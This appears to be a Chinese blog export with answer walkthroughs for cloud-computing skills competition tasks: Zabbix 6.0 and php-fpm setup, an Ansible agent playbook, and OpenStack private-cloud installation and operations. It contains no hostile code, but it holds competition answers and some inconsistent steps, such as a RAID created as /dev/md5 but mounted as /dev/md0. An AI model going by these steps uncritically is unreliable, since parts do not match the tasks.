11修改php.ini文件,其中最大POST数据限制为16M,程序执行时间限制为300，PHP页面接受数据所需最大时间限制为300，把时区设为Asia&#x2F;Shanghai,并重启相关服务。
[root@zabbix_server ~]# vim /etc/php.inipost_max_size = 16Mmax_execution_time = 300max_input_time = 300date.timezone = Asia/Shanghai[root@zabbix_server ~]# systemctl restart php74-php-fpm



12修改www.conf文件,把用户和组都设置为nginx.
 [root@zabbix_server ~]# vim /etc/php-fpm.d/www.confuser = nginxgroup = nginx[root@zabbix_server ~]# cat /etc/php-fpm.d/www.conf | grep -v &#x27;^;\|^$&#x27;[www]listen = 127.0.0.1:9000 listen.allowed_clients = 127.0.0.1user = nginxgroup = nginxpm = dynamicpm.max_children = 50pm.start_servers = 5pm.min_spare_servers = 5pm.max_spare_servers = 35slowlog = /var/log/php-fpm/www-slow.logphp_admin_value[error_log] = /var/log/php-fpm/www-error.logphp_admin_flag[log_errors] = onphp_value[session.save_handler] = filesphp_value[session.save_path] = /var/lib/php/session





13修改zabbix.conf文件,把用户和组都设置为nginx,并将index.php所在的目录和php.ini文件拥有者和用户组改为nginx。重启相关服务，在浏览器中输入http:&#x2F;&#x2F;公网IP&#x2F; setup.php即可看到zabbix 6.0界面。
vim /etc/php-fpm.d/zabbix.conf[zabbix]user = nginxgroup = nginx[root@zabbix_server ~]# chown -R nginx:nginx /usr/share/zabbix/[root@zabbix_server ~]# chown -R nginx:nginx /etc/opt/remi/php74/php.ini[root@zabbix_server ~]# chmod +x /usr/share/zabbix[root@zabbix_server ~]# systemctl restart nginx[root@zabbix_server ~]# systemctl restart zabbix-server[root@zabbix_server ~]# systemctl restart zabbix-agent[root@zabbix_server ~]# systemctl restart php74-php-fpm [root@zabbix_server ~]# curl http://123.249.10.60/setup.php&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;       &lt;head&gt;              &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge&quot;/&gt;              &lt;meta charset=&quot;utf-8&quot; /&gt;              &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;              &lt;meta name=&quot;Author&quot; content=&quot;Zabbix SIA&quot; /&gt;              &lt;title&gt;Installation&lt;/title&gt;              &lt;link rel=&quot;icon&quot; href=&quot;favicon.ico&quot;&gt;              &lt;link rel=&quot;apple-touch-icon-precomposed&quot; sizes=&quot;76x76&quot; href=&quot;assets/img/apple-touch-icon-76x76-precomposed.png&quot;&gt;              &lt;link rel=&quot;apple-touch-icon-precomposed&quot; sizes=&quot;120x120&quot; href=&quot;assets/img/apple-touch-icon-120x120-precomposed.png&quot;&gt;              &lt;link rel=&quot;apple-touch-icon-precomposed&quot; sizes=&quot;152x152&quot; href=&quot;assets/img/apple-touch-icon-152x152-precomposed.png&quot;&gt;              &lt;link rel=&quot;apple-touch-icon-precomposed&quot; sizes=&quot;180x180&quot; href=&quot;assets/img/apple-touch-icon-180x180-precomposed.png&quot;&gt;              &lt;link rel=&quot;icon&quot; sizes=&quot;192x192&quot; href=&quot;assets/img/touch-icon-192x192.png&quot;&gt;              &lt;meta name=&quot;csrf-token&quot; content=&quot;5d4324e81318a310&quot;/&gt;              &lt;meta name=&quot;msapplication-TileImage&quot; content=&quot;assets/img/ms-tile-144x144.png&quot;&gt;              &lt;meta name=&quot;msapplication-TileColor&quot; content=&quot;#d40000&quot;&gt;              &lt;meta name=&quot;msapplication-config&quot; content=&quot;none&quot;/&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;assets/styles/blue-theme.css?1675235994&quot; /&gt;&lt;script src=&quot;js/browsers.js?1674462826&quot;&gt;&lt;/script&gt;&lt;script src=&quot;jsLoader.php?ver=6.0.13&amp;amp;lang=en_US&quot;&gt;&lt;/script&gt;&lt;script src=&quot;jsLoader.php?ver=6.0.13&amp;amp;lang=en_US&amp;amp;files%5B0%5D=setup.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;wrapper&quot;&gt;&lt;main&gt;&lt;form method=&quot;post&quot; action=&quot;setup.php&quot; accept-charset=&quot;utf-8&quot; id=&quot;setup-form&quot;&gt;&lt;div class=&quot;setup-container&quot;&gt;&lt;div class=&quot;setup-left&quot;&gt;&lt;div class=&quot;setup-logo&quot;&gt;&lt;div class=&quot;zabbix-logo&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;ul&gt;&lt;li class=&quot;setup-left-current&quot;&gt;Welcome&lt;/li&gt;&lt;li&gt;Check of pre-requisites&lt;/li&gt;&lt;li&gt;Configure DB connection&lt;/li&gt;&lt;li&gt;Settings&lt;/li&gt;&lt;li&gt;Pre-installation summary&lt;/li&gt;&lt;li&gt;Install&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;div class=&quot;setup-right&quot;&gt;&lt;div class=&quot;setup-right-body&quot;&gt;&lt;div class=&quot;setup-title&quot;&gt;&lt;span&gt;Welcome to&lt;/span&gt;Zabbix 6.0&lt;/div&gt;&lt;ul class=&quot;table-forms&quot;&gt;&lt;li&gt;&lt;div class=&quot;table-forms-td-left&quot;&gt;&lt;label for=&quot;label-default-lang&quot;&gt;Default language&lt;/label&gt;&lt;/div&gt;&lt;div class=&quot;table-forms-td-right&quot;&gt;&lt;z-select id=&quot;default-lang&quot; value=&quot;en_US&quot; focusable-element-id=&quot;label-default-lang&quot; autofocus=&quot;autofocus&quot; name=&quot;default_lang&quot; data-options=&quot;[&#123;&amp;quot;value&amp;quot;:&amp;quot;en_GB&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;English (en_GB)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;en_US&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;English (en_US)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;ca_ES&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Catalan (ca_ES)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;zh_CN&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Chinese (zh_CN)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;cs_CZ&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Czech (cs_CZ)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;fr_FR&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;French (fr_FR)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;de_DE&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;German (de_DE)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;he_IL&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Hebrew (he_IL)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;it_IT&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Italian (it_IT)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;ko_KR&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Korean (ko_KR)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;ja_JP&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Japanese (ja_JP)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;nb_NO&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Norwegian (nb_NO)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;pl_PL&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Polish (pl_PL)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;pt_BR&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Portuguese (pt_BR)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;pt_PT&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Portuguese (pt_PT)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;ro_RO&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Romanian (ro_RO)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;ru_RU&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Russian (ru_RU)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;sk_SK&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Slovak (sk_SK)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;tr_TR&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Turkish (tr_TR)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;uk_UA&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Ukrainian (uk_UA)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;vi_VN&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Vietnamese (vi_VN)&amp;quot;&#125;]&quot; tabindex=&quot;-1&quot;&gt;&lt;/z-select&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;setup-footer&quot;&gt;&lt;div&gt;&lt;button type=&quot;submit&quot; id=&quot;next_1&quot; name=&quot;next[1]&quot; value=&quot;Next step&quot;&gt;Next step&lt;/button&gt;&lt;button type=&quot;submit&quot; id=&quot;back_1&quot; name=&quot;back[1]&quot; value=&quot;Back&quot; class=&quot;btn-alt float-left&quot; disabled=&quot;disabled&quot;&gt;Back&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/form&gt;&lt;div class=&quot;signin-links&quot;&gt;Licensed under &lt;a target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; class=&quot;grey link-alt&quot; href=&quot;https://www.zabbix.com/license&quot;&gt;GPL v2&lt;/a&gt;&lt;/div&gt;&lt;/main&gt;&lt;footer role=&quot;contentinfo&quot;&gt;Zabbix 6.0.13. &amp;copy; 2001&amp;ndash;2023, &lt;a class=&quot;grey link-alt&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; href=&quot;https://www.zabbix.com/&quot;&gt;Zabbix SIA&lt;/a&gt;&lt;/footer&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;



14随机找一目录，在其下分别创建tasks和file目录，把autoDeployment.tar、编写好的repo文件和zabbix_agentd.conf传至file目录，在tasks目录下编写agent.yaml文件，要求在被监控机能远程部署zabbix-agent服务。
[root@zabbix_server opt]# cat agent.yaml---- hosts: agent  become: true  tasks:  - name: copy local.repo    copy:      src: local.repo      dest: /etc/yum.repos.d/local.repo  - name: Copy autoDeployment.tar    copy:      src: autoDeployment.tar      dest: /opt  - name: Copy zabbix_agentd.conf file    copy:      src: zabbix_agentd.conf      dest: /etc/zabbix/zabbix_agentd.conf      owner: zabbix      group: zabbix      mode: &#x27;0644&#x27;  - name: tar autoDeployment.tar    shell:      cmd: tar -vxf autoDeployment.tar  -C /opt  - name: Install Zabbix Agent    yum:      name: zabbix-agent      state: present  - name: Start and enable Zabbix Agent    service:      name: zabbix-agent      state: started      enabled: true

]]></content>
      <categories>
        <category>云计算</category>
        <category>技能大赛汇总</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云计算职业技能大赛</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-2022年云计算技能大赛-赛题私有云（部分）</title>
    <url>/posts/aa9fe4ac.html</url>
    <content><![CDATA[第一套赛题


主机名
接口
ip地址



controller
ens33 ens34
192.168.100.10  192.168.200.10


compute
en33   ens34
192.168.100.20 192.168.200.20


任务1  基础运维任务（5分）1．根据表1中的IP地址规划，设置各服务器节点的IP地址，确保网络正常通信，设置云服务器1主机名为Controller，云服务器2主机名为Compute，并修改hosts文件将IP地址映射为主机名，关闭防火墙并设置为开机不启动，设置SELinux为Permissive 模式。
controller
#更改主机名hostnamectl set-hostname controller#添加映射cat /etc/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.100.10 controller192.168.100.20 compute#关闭防火墙systemctl stop firewalld &amp;&amp; systemctl disable firewalld#设置selinuxsetenforce 0vi /etc/selinux/configSELINUX=permissive #修改为permissive

compute
#修改主机名hostnamectl set-hostname compute#添加映射cat /etc/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.100.10 controller192.168.100.20 compute#关闭防火墙systemctl stop firewalld &amp;&amp; systemctl disable firewalld#设置selinuxsetenforce 0vi /etc/selinux/configSELINUX=permissive #修改为permissive

2．将提供的CentOS-7-x86_64-DVD-1804.iso和OpenStackQueens.iso光盘镜像上传到Controller节点&#x2F;root目录下，然后在&#x2F;opt目录下分别创建centos目录和openstack目录，并将镜像文件CentOS-7-x86_64-DVD-1804.iso挂载到centos目录下，将镜像文件OpenStackQueens.iso挂载到openstack目录下。
（若无OpenStackQueens.iso，可用国赛镜像代替）
#创建目录mkdir /opt/centosmkdir /opt/openstack#挂载mount CentOS-7-x86_64-DVD-1804.iso /opt/centos/mount chinaskills_cloud_iaas.iso /opt/openstack/

3．在Controller节点上利用centos目录中的软件包安装vsftp服务器，设置开机自启动，并使用ftp提供yum仓库服务，分别设置controller节点和compute节点的yum源文件ftp.repo，其中ftp服务器地址使用IP形式。
controller
mv /etc/yum.repos.d/* /etc/yum#编写yum源cat /etc/yum.repos.d/local.repo[centos]name=centosbaseurl=file:///opt/centosgpgcheck=0enabled=1[openstack]name=openstackbaseurl=file:///opt/openstack/iaas-repogpgcheck=0enabled=1#更新缓存区yum repolist#安装并配置vsftpdyum install -y vsftpdvi /etc/vsftpd/vsftpd.confanon_root=/opt/#启动服务systemctl start vsftpdsystemctl enable vsftpd

compute
mv /etc/yum.repos.d/* /etc/yumcat /etc/yum.repos.d/ftp.repo[centos]name=centosbaseurl=ftp://192.168.100.10/centosgpgcheck=0enabled=1[openstack]name=openstackbaseurl=ftp://192.168.100.10/openstack/iaas-repogpgcheck=0enabled=1#更新缓存区yum repolist

4．在Controller节点上部署chrony服务器，允许其他节点同步时间，启动服务并设置为开机启动；在compute节点上指定controller节点为上游NTP服务器，重启服务并设为开机启动。
controller
#安装chrony服务器yum install -y chronyvi /etc/chrony.conf#server 0.centos.pool.ntp.org iburst#server 1.centos.pool.ntp.org iburst#server 2.centos.pool.ntp.org iburst#server 3.centos.pool.ntp.org iburstserver controller iburst#添加在最后allow 192.168.100.0/24local stratum 10#重启并设为开机自动启动systemctl restart chronydsystemctl enable chronyd#生效chronyc sources

compute
vi /etc/chrony.conf#server 0.centos.pool.ntp.org iburst#server 1.centos.pool.ntp.org iburst#server 2.centos.pool.ntp.org iburst#server 3.centos.pool.ntp.org iburstserver controller iburst#重启并设为开机自动启动systemctl restart chronydsystemctl enable chronyd#生效chronyc sources

5．在compute节点上利用空白分区划分2个100G分区。
compute
fdisk /dev/sdb

任务2  OpenStack搭建任务（10分）1．在控制节点和计算节点上分别安装quickinstall软件包，根据表2配置脚本文件中基本变量（配置脚本文件为&#x2F;etc&#x2F;cloudconfig&#x2F;openrc.sh）。

2．在controller节点上使用 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-mysql.sh 脚本安装Mariadb、Memcached、etcd服务。
3．在controller节点上使用  &#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-keystone.sh 脚本安装Keystone 服务。
4．在controller节点上使用&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-glance.sh脚本安装glance 服务。
5．在controller节点和compute节点上分别使用&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-nova -controller.sh脚本、&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-nova-compute.sh脚本安装Nova 服务。
6．在controller节点和compute节点上分别修改&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-neutron -controller.sh脚本、&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-neutron-compute.sh脚本分别安装 Neutron 服务，网络选用vlan模式。
7．在controller节点上使用 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-heat.sh脚本安装dashboad服务。
8．在controller节点和compute节点上分别修改&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install–cinder -controller.sh脚本、&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install -cinder-compute.sh脚本安装cinder服务。
任务3  OpenStack云平台运维（10分）1．在openstack私有云平台上，基于cirrors.qcow2镜像，使用命令创建一个名为cirros的镜像。
 openstack image create cirros --disk-format qcow2 --container bare --file /root/cirros-0.3.4-x86_64-disk.img +------------------+------------------------------------------------------+| Field            | Value                                                |+------------------+------------------------------------------------------+| checksum         | ee1eca47dc88f4879d8a229cc70a07c6                     || container_format | bare                                                 || created_at       | 2022-10-11T02:22:06Z                                 || disk_format      | qcow2                                                || file             | /v2/images/4650b6d8-97dc-44e2-89f0-3c674f22f422/file || id               | 4650b6d8-97dc-44e2-89f0-3c674f22f422                 || min_disk         | 0                                                    || min_ram          | 0                                                    || name             | cirros                                               || owner            | d58a1b0d053d4fd7ac1ddd98131973b3                     || protected        | False                                                || schema           | /v2/schemas/image                                    || size             | 13287936                                             || status           | active                                               || tags             |                                                      || updated_at       | 2022-10-11T02:22:06Z                                 || virtual_size     | None                                                 || visibility       | shared                                               |+------------------+------------------------------------------------------+

2．在openstack私有云平台上，使用命令创建一个名为Fmin，ID为1，内存为1024 MB，磁盘为10 GB，vcpu数量为1的云主机类型。
nova flavor-create Fmin 1 1024 10 1+----+------+-----------+------+-----------+------+-------+-------------+-----------+-------------+| ID | Name | Memory_MB | Disk | Ephemeral | Swap | VCPUs | RXTX_Factor | Is_Public | Description |+----+------+-----------+------+-----------+------+-------+-------------+-----------+-------------+| 1  | Fmin | 1024      | 10   | 0         |      | 1     | 1.0         | True      | -           |+----+------+-----------+------+-----------+------+-------+-------------+-----------+-------------+

3．在openstack私有云平台上，使用命令创建云主机外部网络extnet，子网extsubnet，虚拟机浮动 IP 网段为192.168.x.0&#x2F;24（其中x是考位号）， 网关为192.168.x.1，网络使用vlan模式。
#创建网络openstack network create extnet --provider-network-type vlan --external --provider-physical-network provider #绑定子网 openstack subnet create extsubnet --network extnet  --dhcp --gateway 192.168.200.1 --allocation-pool start=192.168.200.100,end=192.168.200.200 --subnet-range 192.168.200.0/24

4．在openstack私有云平台上，通过使用命令创建云主机内网intnet，子网intsubnet，虚拟机子网 IP 网段为10.10.x.0&#x2F;24（其中x是考位号），网关为10.10.x.1。
#创建内网openstack network create intnet --internal#绑定子网openstack subnet create intsubnet --network intnet  --dhcp --gateway 10.10.200.1 --allocation-pool start=10.10.200.100,end=10.10.200.200 --subnet-range 10.10.200.0/24

5．添加名为 ext-router 的路由器，配置路由接口地址，完成内网子网intsubnet和外部网络extnet的连通。
#创建路由openstack router create ext-router  --enableopenstack router set --enable --enable-snat --external-gateway extnet ext-router#子网连通openstack router add subnet ext-router intsubnet

6．在openstack私有云平台上，基于“cirros” 镜像、1vCPU&#x2F;1G &#x2F;10G 的flavor、 intsubnet的网络，绑定浮动IP，使用命令创建一台虚拟机VM1，启动VM1，并使用PC机能远程登录到VM1。
#若无法连接虚拟机vm1可能是外部网络的模式不正确。可以修改网络模式#创建云主机nova boot --image cirros --flavor Fmin --nic net-name=intnet VM1 #创建浮动ipopenstack floating  ip create extnet#查看浮动ip的idopenstack floating ip list#绑定openstack server add floating ip VM1 7bf5fa40-ec57-4abf-a666-b65082102a22

7．在openstack私有云平台上，创建一个名为“lvm”的卷类型，创建1块卷类型为lvm的40G云盘，并附加到虚拟机VM1上。
#创建卷类型openstack volume type create lvm#创建lvm类型的卷openstack volume create --type lvm --size 40 disk1#绑定openstack server add volume VM1 disk1

8．在虚拟机VM1上，使用附加的云盘，划分为4个10G的分区，创建一个raid 5，其中1个分区作为热备。
#分区 （注意分区内存都为10G）fdisk /dev/vdbCommand (m for help): pDisk /dev/vdb: 21.5 GB, 21474836480 bytes, 41943040 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk label type: dosDisk identifier: 0x60fa7e70   Device Boot      Start         End      Blocks   Id  System/dev/vdb1            2048     8390655     4194304   83  Linux/dev/vdb2         8390656    16779263     4194304   83  Linux/dev/vdb3        16779264    25167871     4194304   83  Linux/dev/vdb4        25167872    33556479     4194304   83  Linux#添加yum源mv /etc/yum.repos.d/* /etc/yumcat /etc/yum.repos.d/ftp.repo[centos]name=centosbaseurl=ftp://192.168.100.10/centosgpgcheck=0enabled=1[openstack]name=openstackbaseurl=ftp://192.168.100.10/openstack/iaas-repogpgcheck=0enabled=1#安装mdadmyum install -y mdadmmdadm -C /dev/md5 -a yes -l 5 -n 3 -x 1 /dev/vdb&#123;1,2,3,4&#125;#参数解释# -C  创建的意思#/dev/md0  创建的raid名字，题目要求什么就给什么#-C下的 -a yes|no 是否自动创建目标RAID设备的设备文件#-l Raid的等级#-n 使用多少块硬盘来创建当前Raid#-x 空闲盘，这也就是热备盘了，当正常的盘出问题了，这块盘就能从 share状态 转换到 spare rebuilding状态，模拟情况见下方#查看详细信息mdadm -D /dev/md5   #-D 显示raid的详细信息#挂载mkdir /backup #创建挂载点，挂载磁盘mkfs.ext4 /dev/md5 #格式化磁盘，格式方式为ext4mount /dev/md0 /backup #挂载磁盘到/backup目录df -h #查看磁盘挂载情况

9．在Controller节点中编写&#x2F;root&#x2F;openstack&#x2F;deletevm.sh的shell脚本,释放虚拟机VM1，执行脚本完成实例释放。
cat deletevm.sh#!/bin/bashsource /etc/keystone/admin-openrc.shopenstack server remove volume VM1 disk1 #删除挂载的disk1openstack server  remove floating ip VM1 192.168.200.118 #删除网络openstack server delete VM1

第二套赛题任务1 基础运维任务1．根据表1中的IP地址规划，设置各服务器节点的IP地址，确保网络正常通信，设置云服务器1主机名为Controller，云服务器2主机名为Compute，并修改hosts文件将IP地址映射为主机名，关闭防火墙并设置为开机不启动，设置SELinux为Permissive 模式。
controller
#更改主机名hostnamectl set-hostname controller#添加映射cat /etc/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.100.10 controller192.168.100.20 compute#关闭防火墙systemctl stop firewalld &amp;&amp; systemctl disable firewalld#设置selinuxsetenforce 0vi /etc/selinux/configSELINUX=permissive #修改为permissive

compute
#修改主机名hostnamectl set-hostname compute#添加映射cat /etc/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.100.10 controller192.168.100.20 compute#关闭防火墙systemctl stop firewalld &amp;&amp; systemctl disable firewalld#设置selinuxsetenforce 0vi /etc/selinux/configSELINUX=permissive #修改为permissive

2．将提供的CentOS-7-x86_64-DVD-1804.iso和OpenStackQueens.iso光盘镜像上传到Compute节点的&#x2F;root目录下，然后在&#x2F;opt目录下分别创建centos目录和openstack目录，并将镜像文件CentOS-7-x86_64-DVD-1804.iso挂载到centos目录下，将镜像文件OpenStackQueens.iso挂载到openstack目录下。
(若无该镜像用国赛镜像代替)
#创建目录mkdir /opt/centosmkdir /opt/openstack#挂载mount CentOS-7-x86_64-DVD-1804.iso /opt/centos/mount chinaskills_cloud_iaas.iso /opt/openstack/

3．在Compute节点上利用centos目录中的软件包安装httpd服务器并设置开机自启动，提供yum仓库服务，并分别设置controller节点和compute节点的yum源文件http.repo，其中节点的地址使用IP形式。
controller
mv /etc/yum.repos.d/* /etc/yum#编写yum源cat /etc/yum.repos.d/local.repo[centos]name=centosbaseurl=file:///opt/centosgpgcheck=0enabled=1[openstack]name=openstackbaseurl=file:///opt/openstack/iaas-repogpgcheck=0enabled=1#更新缓存区yum repolist#安装并配置vsftpdyum install -y vsftpdvi /etc/vsftpd/vsftpd.confanon_root=/opt/#启动服务systemctl start vsftpdsystemctl enable vsftpd

compute
mv /etc/yum.repos.d/* /etc/yumcat /etc/yum.repos.d/http.repo[centos]name=centosbaseurl=ftp://192.168.100.10/centosgpgcheck=0enabled=1[openstack]name=openstackbaseurl=ftp://192.168.100.10/openstack/iaas-repogpgcheck=0enabled=1#更新缓存区yum repolist

4．在Controller节点上部署chrony服务器，允许其他节点同步时间，启动服务并设置为开机启动；并在compute节点上指定controller节点为上游NTP服务器，重启服务并设为开机启动。
controller
#安装chrony服务器yum install -y chronyvi /etc/chrony.conf#server 0.centos.pool.ntp.org iburst#server 1.centos.pool.ntp.org iburst#server 2.centos.pool.ntp.org iburst#server 3.centos.pool.ntp.org iburstserver controller iburst#添加在最后allow 192.168.100.0/24local stratum 10#重启并设为开机自动启动systemctl restart chronydsystemctl enable chronyd#生效chronyc source

compute
vi /etc/chrony.conf#server 0.centos.pool.ntp.org iburst#server 1.centos.pool.ntp.org iburst#server 2.centos.pool.ntp.org iburst#server 3.centos.pool.ntp.org iburstserver controller iburst#重启并设为开机自动启动systemctl restart chronydsystemctl enable chronyd#生效chronyc sources

5．在compute节点上查看分区情况，并利用空白分区划分2个100G分区。
fdisk /dev/sdb



任务2  OpenStack搭建任务1．在控制节点和计算节点上分别安装quickinstall软件包，根据表2配置脚本文件中基本变量（配置脚本文件为&#x2F;etc&#x2F;cloudconfig&#x2F;openrc.sh）。
2．在controller点上使用 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-mysql.sh 脚本安装Mariadb、Memcached、etcd服务。
3．在controller节点上使用  &#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-keystone.sh 脚本安装Keystone 服务。
4．在controller节点上使用&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-glance.sh脚本安装 glance 服务。
5．在controller节点和compute节点上分别使用&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-nova -controller.sh脚本、&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-nova-compute.sh脚本安装Nova 服务。
6．在controller节点和compute节点上分别修改&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-neutron -controller.sh脚本、&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-neutron-compute.sh脚本分别安装 Neutron 服务，网络选用vlan模式。
7．在controller节点上使用 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-heat.sh 脚本dashboad服务。
8．在controller节点和compute节点上分别修改&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-swift -controller.sh脚本、&#x2F;usr&#x2F;local&#x2F;bin&#x2F;openstack-install-swift -controller.sh脚本安装 swift服务。
任务3  OpenStack云平台运维（10分）1．在openstack私有云平台上，基于cirrors.qcow2镜像，使用命令创建一个名为cirros的镜像。
 openstack image create cirros --disk-format qcow2 --container bare --file /root/cirros-0.3.4-x86_64-disk.img +------------------+------------------------------------------------------+| Field            | Value                                                |+------------------+------------------------------------------------------+| checksum         | ee1eca47dc88f4879d8a229cc70a07c6                     || container_format | bare                                                 || created_at       | 2022-10-11T02:22:06Z                                 || disk_format      | qcow2                                                || file             | /v2/images/4650b6d8-97dc-44e2-89f0-3c674f22f422/file || id               | 4650b6d8-97dc-44e2-89f0-3c674f22f422                 || min_disk         | 0                                                    || min_ram          | 0                                                    || name             | cirros                                               || owner            | d58a1b0d053d4fd7ac1ddd98131973b3                     || protected        | False                                                || schema           | /v2/schemas/image                                    || size             | 13287936                                             || status           | active                                               || tags             |                                                      || updated_at       | 2022-10-11T02:22:06Z                                 || virtual_size     | None                                                 || visibility       | shared                                               |+------------------+------------------------------------------------------+

2．在openstack私有云平台上，编写模板server.yml，创建名为“m1.flavor”、 ID 为 1234、 内存为 1024MB、硬盘为 20GB、 vcpu数量为 2的云主机类型。
# 在 controller节点安装 heat 服务[root@controller opt]# iaas-install-heat.sh # 查看资源类型[root@controller opt]# heat resource-type-listWARNING (shell) &quot;heat resource-type-list&quot; is deprecated, please use &quot;openstack orchestration resource type list&quot; instead	# 这里是警告 让使用 openstack orchestration resource type list 这个命令，不影响后续+------------------------------------------+| resource_type                            |+------------------------------------------+| AWS::AutoScaling::AutoScalingGroup       ||...					   || OS::Cinder::EncryptedVolumeType          || OS::Cinder::QoSAssociation               || OS::Cinder::QoSSpecs                     || OS::Cinder::Quota                        || OS::Cinder::Volume                       || OS::Cinder::VolumeAttachment             || OS::Cinder::VolumeType                   || OS::Glance::Image                        || OS::Heat::AccessPolicy                   || OS::Heat::AutoScalingGroup               || OS::Heat::CloudConfig                    || OS::Heat::DeployedServer                 || OS::Heat::InstanceGroup                  || OS::Heat::MultipartMime                  || OS::Heat::None                           || OS::Heat::RandomString                   || OS::Heat::ResourceChain                  || OS::Heat::ResourceGroup                  || OS::Heat::ScalingPolicy                  || OS::Heat::SoftwareComponent              || OS::Heat::SoftwareConfig                 || OS::Heat::SoftwareDeployment             || OS::Heat::SoftwareDeploymentGroup        || OS::Heat::Stack                          || OS::Heat::StructuredConfig               || OS::Heat::StructuredDeployment           || OS::Heat::StructuredDeploymentGroup      || OS::Heat::TestResource                   || OS::Heat::UpdateWaitConditionHandle      || OS::Heat::Value                          || OS::Heat::WaitCondition                  || OS::Heat::WaitConditionHandle            || OS::Keystone::Domain                     || OS::Keystone::Endpoint                   || OS::Keystone::Group                      || OS::Keystone::GroupRoleAssignment        || OS::Keystone::Project                    || OS::Keystone::Region                     || OS::Keystone::Role                       || OS::Keystone::Service                    || OS::Keystone::User                       || OS::Keystone::UserRoleAssignment         || OS::Neutron::AddressScope                || OS::Neutron::ExtraRoute                  || OS::Neutron::FloatingIP                 